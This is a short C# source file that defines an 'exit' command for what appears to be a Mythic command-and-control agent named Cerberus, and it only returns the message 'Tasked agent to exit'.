using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cerberus.Commands
{
    public class Exit : CerberusCommand
    {
        public override string Name => "exit";

        public override string Execute(MythicTask task)
        {
            return "Tasked agent to exit";
        }
    }
}
